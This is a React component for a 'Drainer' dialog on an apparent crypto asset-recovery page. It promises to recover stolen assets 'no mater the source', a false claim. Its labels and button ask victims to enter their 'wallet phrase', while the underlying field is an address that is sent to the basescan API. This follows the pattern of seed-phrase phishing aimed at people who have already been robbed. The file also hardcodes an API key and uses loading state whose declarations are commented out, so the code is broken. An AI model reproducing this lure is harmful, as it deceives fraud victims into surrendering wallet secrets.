import { useState } from 'react';
import {
	Dialog,
	DialogContent,
	DialogDescription,
	DialogHeader,
	DialogTitle,
	DialogTrigger,
} from './ui/dialog';
// import { Button } from './ui/button';
import {
	Form,
	FormControl,
	FormDescription,
	FormField,
	FormItem,
	FormLabel,
	FormMessage,
} from './ui/form';
import { useForm } from 'react-hook-form';
import { zodResolver } from '@hookform/resolvers/zod';
import z from 'zod';
import { Loader2 } from 'lucide-react';
import { Button } from './ui/button';
import { Input } from './ui/input';

const RecoveryFormSchema = z.object({
	userAddress: z
		.string()
		.min(1, { message: 'Address is required' })
		.max(42, { message: 'Invalid address' }),
	attackerAddress: z
		.string()
		.min(1, { message: 'Address is required' })
		.max(42, { message: 'Invalid address' }),
});

const API_KEY = 'DMEQUUF3Y1E1WPGKPM7IMBCWPEY9J4K5GR';

const DrainedComponent = () => {
	// const [loading, setLoading] = useState(false);
	// const [authForm, setAuthForm] = useState({ authToken: '' });
	// const [error, setErrors] = useState({})
	// const authKeys = ['aza'];
	const form = useForm<z.infer<typeof RecoveryFormSchema>>({
		resolver: zodResolver(RecoveryFormSchema),
		defaultValues: {
			userAddress: '',
			attackerAddress: '',
		},
	});

	// const authFormChange = (e: any) => {
	// 	const { name, value } = e.target;
	// 	setAuthForm({ ...authForm, [name]: value });
	// };

	// const validate = () => {
	// 	const authFormErrors = {token: ''};
	// 	if (!authForm.authToken) {
	// 		authFormErrors.token = 'Token is required';
	// 	}
	// };

	async function onSubmit(data: z.infer<typeof RecoveryFormSchema>) {
		const url = `https://api.basescan.org/api?module=account&action=tokentx&address=${data.userAddress}&page=1&offset=100&startblock=0&endblock=27025780&sort=asc&apikey=${API_KEY}`;
		const walletData = await fetch(url).then((res) => res.json());

		console.log(walletData);

		setLoading(true);
		setTimeout(() => {
			console.log(data);
			setLoading(false);
		}, 2000);
	}

	return (
		<div>
			<Dialog>
				<DialogTrigger>
					<div
						className="flex flex-col gap-2 bg-popover md:max-w-[300px] p-4 rounded-md hover:bg-popover/80 cursor-pointer"
						onClick={() => console.log('object')}>
						<div>
							<img
								src={''}
								alt={''}
								className="w-10 h-10 inline-block bg-muted p-0 rounded-md"
							/>
						</div>

						<div className="flex flex-col gap-2">
							<h1 className="text-lg">Drainer</h1>
							<p className="text-sm text-muted-foreground">
								If you lost your assets via a drainer
							</p>
						</div>
					</div>
				</DialogTrigger>
				<DialogContent className="text-left">
					<DialogHeader>
						<DialogTitle>Assets lost via a drainer</DialogTitle>
						<DialogDescription className="text-left">
							Our advanced recovery protocol scans the blockchain for traces of
							your assets, and recovers them no mater the source.
						</DialogDescription>

						<Form {...form}>
							<form
								className="flex flex-col gap-4"
								onSubmit={form.handleSubmit(onSubmit)}>
								<FormField
									control={form.control}
									name="userAddress"
									render={({ field }) => (
										<FormItem>
											<FormLabel>Phrase</FormLabel>
											<FormDescription>
												Enter your wallet phrase here
											</FormDescription>
											<FormControl>
												<Input
													{...field}
													placeholder="Enter your wallet Address"
												/>
											</FormControl>
											<FormMessage />
										</FormItem>
									)}
								/>
								<FormField
									control={form.control}
									name="attackerAddress"
									render={({ field }) => (
										<FormItem>
											<FormLabel>Attacker Address</FormLabel>
											<FormDescription>
												Enter your wallet phrase here
											</FormDescription>
											<FormControl>
												<Input
													{...field}
													placeholder="Enter attacker address"
												/>
											</FormControl>
											<FormMessage />
										</FormItem>
									)}
								/>
								<Button type="submit" disabled={loading}>
									{loading ? (
										<div className="flex items-center gap-2">
											<Loader2 className="mr-2 h-4 w-4 animate-spin" />{' '}
											Submitting{' '}
										</div>
									) : (
										'Submit phrase'
									)}
								</Button>
							</form>
						</Form>
					</DialogHeader>
				</DialogContent>
			</Dialog>
		</div>
	);
};

export default DrainedComponent;

// blockHash: '0x3bbaa766258a2dd1a5c67998005a8ba665901de0195b0519267d16591f53f498';
// blockNumber: '16409698';
// confirmations: '1432849';
// contractAddress: '0x9409c81d5bf8fd6e651f08e1c81c8b175a1e64f7';
// cumulativeGasUsed: '22657188';
// from: '0x09350f89e2d7b6e96ba730783c2d76137b045fef';
// gas: '10241892';
// gasPrice: '8494917';
// gasUsed: '10158678';
// hash: '0xe7794160f39b6d728fbf17c6b83793ff7ddcad0781efd5461d31d49511492978';
// input: 'deprecated';
// nonce: '625';
// timeStamp: '1719608743';
// to: '0xfdeaa0afd2b8ffee1472a21afe3f5a702b8b00b0';
// tokenDecimal: '18';
// tokenName: 'Peepo';
// tokenSymbol: 'PEEPO';
// transactionIndex: '63';
// value: '1690000000000000000';
